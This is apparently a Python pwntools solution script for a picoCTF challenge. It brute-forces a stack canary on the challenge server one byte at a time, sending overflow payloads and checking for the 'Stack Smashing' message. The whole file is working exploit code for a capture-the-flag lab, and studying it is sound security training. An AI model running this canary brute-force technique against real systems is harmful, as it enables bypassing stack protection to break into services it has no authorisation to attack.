from pwn import *

# details
HOST = "saturn.picoctf.net"
PORT = 64631

context.binary = './vuln'
context.arch = 'i386'
#context.log_level = 'debug'

offset_to_canary = b"A"*64  # from the start of the payload
canary = ['A', 'A', 'A', 'A']
buf_size = "100"


for i in range(4):  # for on all 4 bytes
    for c in range(256):  # for on all possible values for 1 byte
        r = remote(HOST, PORT)
        r.sendline(buf_size)  # sending the buffer size
        r.recv()
        #r = process(["./vuln"])
        payload = offset_to_canary
        payload += ''.join(canary[0:i])
        payload += str(chr(c))

        r.send(payload)  # sending the payload

        data = r.recvall()
        r.close()

        print("\nTried: {}\n".format(hex(c)))
        print("####" + data + "####")
        if "Stack Smashing" not in data:  # we got a byte of the canary!
            print("+Found byte! {}".format(hex(c)))
            canary[i] = chr(c)
            break

print("Canary is: {}".format(''.join(canary)))
